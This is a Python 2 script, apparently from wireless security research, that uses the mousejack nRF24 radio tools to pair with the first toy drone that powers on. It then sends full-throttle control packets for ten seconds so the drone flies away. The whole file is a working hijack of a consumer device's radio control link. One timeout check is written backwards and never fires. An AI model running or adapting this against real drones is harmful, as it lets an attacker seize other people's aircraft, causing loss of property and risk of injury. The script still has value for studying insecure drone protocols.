#!/usr/bin/env python2
import array
import logging
import os
import sys
import time
import struct

scriptdir = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(scriptdir, 'mousejack/tools'))

from lib import common
from droneduel import *


# Fly, fly away!
def fly_fly_away(vid):
    phase = 0x55
    cid = [0x00, 0x00, 0x00, 0x00]

    # Build the packet
    packet = drone_packet(phase, cid, list(vid), throttle=2000)
    packet_bytes = packet.to_bytes()

    # Tune to channel 3, where we'll transmit at a 100% duty cycle
    common.radio.set_channel(3)

    # Transmit for 10 seconds, which will fly the drone for less than 10 seconds due to
    # a delay (caused an intense fear of nets) which offsets the start by some number of
    # units of time. This seems to be variable, but it's unclear exactly
    # what's happening.
    start = time.time()
    while True:
        if time.time() - start > 10:
            break
        common.radio.transmit_payload_generic(
            packet_bytes, address='\xFF\xFF\xFF\xFF\xFF')


# Pair to the first drone that gets turned on
def pair_drone():
    SEARCHING, RESPONDING, PAIRED = 0, 1, 2
    phase = 0xAA
    cid = [0x00, 0x00, 0x00, 0x00]
    vid = [0xFF, 0xFF, 0xFF, 0xFF]
    state = SEARCHING

    # Initial pairing sync packet
    sync_packet = drone_packet(phase, cid, vid).to_bytes()

    # Wait for a drone to turn on, and then pair with it
    while True:
        if state == SEARCHING:

            # Transmit a "pairing sync" packet
            logging.debug('Searching')
            common.radio.transmit_payload_generic(
                sync_packet, address='\xFF\xFF\xFF\xFF\xFF')

            # Wait for 50ms and then look for a reply
            time.sleep(0.05)
            payload = common.radio.receive_payload()

            # Parse the received packet
            if len(payload) > 1:
                crc_success, rx_packet = parse_packet(payload.tostring())

                # Ignore CRC failures
                if not crc_success:
                    logging.debug('CRC Failure')
                    continue

                # If ACK has been received, send the response
                elif rx_packet.aileron == 0:

                    # For some reason this 250ms delay makes things work more
                    # better I think
                    time.sleep(0.25)

                    # Build a response packet
                    response_packet = drone_packet(
                        phase, cid, rx_packet.vid).to_bytes()
                    vid = rx_packet.vid
                    logging.debug('Received ACK, Responding')
                    state = RESPONDING
                    respond_start = time.time()
                    continue

        elif state == RESPONDING:

            # Timeout after 500ms
            if respond_start - time.time() > 0.5:
                state = SEARCHING
                logging.debug('Pairing timed out, restarting')
                continue

            # Transmit a response packet
            logging.debug('Responding')
            common.radio.transmit_payload_generic(
                response_packet, address='\xFF\xFF\xFF\xFF\xFF')

            # Wait for 50ms and then look for a reply
            time.sleep(0.05)
            payload = common.radio.receive_payload()

            # Parse the received packet
            if len(payload) > 1:
                crc_success, rx_packet = parse_packet(payload.tostring())

                # Ignore CRC failures
                if not crc_success:
                    logging.debug('CRC Failure')
                    state = SEARCHING
                    continue

                # Pairing is complete
                elif rx_packet.aileron == 1:
                    time.sleep(0.25)
                    logging.debug('Paired')
                    state = PAIRED
                    break

    logging.info("Done Pairing")
    return vid


# Init command line args
common.init_args('./fly-fly-away.py')
common.parse_and_init()

# Put the radio in promiscuous mode (generic)
common.radio.enter_promiscuous_mode_generic('\x71\x0F\x55', common.RF_RATE_1M)

# Tune to 2402 MHz
common.radio.set_channel(2)

# Pair to a drone
vid = pair_drone()

# Fly, fly away!
fly_fly_away(vid)
